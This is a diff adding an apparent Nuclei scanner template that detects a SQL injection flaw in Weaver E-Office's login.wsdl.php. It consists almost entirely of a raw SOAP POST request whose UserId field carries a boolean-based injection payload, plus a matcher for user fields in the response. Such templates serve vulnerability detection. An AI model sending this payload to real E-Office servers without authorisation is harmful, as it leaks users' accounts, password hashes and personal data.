@@ -1,0 +1,38 @@
+id: CVD-2022-1170
+
+info:
+  name: 泛微 E-Office login.wsdl.php 文件 SQL 注入漏洞
+  author: SleepingBag945
+  severity: high
+  description: 攻击者可通过此漏洞获取系统内任意用户信息，例如账号、加密密码、手机号、名字等。密码解密后可浏览oa内部系统信息文件等
+
+http:
+  - raw:
+      - |
+        POST /webservice-json/login/login.wsdl.php HTTP/1.1
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+        SOAPAction: urn:LoginServicewsdl#GetCurrentInformation
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <urn:GetCurrentInformation soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                <UserId xsi:type="xsd:string">gero et' OR NOT 5136=5137#</UserId>
+              </urn:GetCurrentInformation>
+          </soapenv:Body>
+        </soapenv:Envelope>
+        
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"USER_ID","USER_NAME")'
